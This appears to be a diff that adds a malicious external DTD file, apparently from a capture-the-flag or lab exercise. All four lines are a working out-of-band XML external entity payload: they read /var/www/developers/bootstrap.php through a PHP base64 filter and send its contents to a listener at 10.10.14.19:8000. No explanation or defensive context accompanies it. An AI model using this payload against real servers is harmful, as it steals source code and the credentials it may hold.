@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/developers/bootstrap.php">
+<!ENTITY % payload "<!ENTITY &#x25; run SYSTEM 'http://10.10.14.19:8000/?x=%file;'>">
+%payload;
+%run;
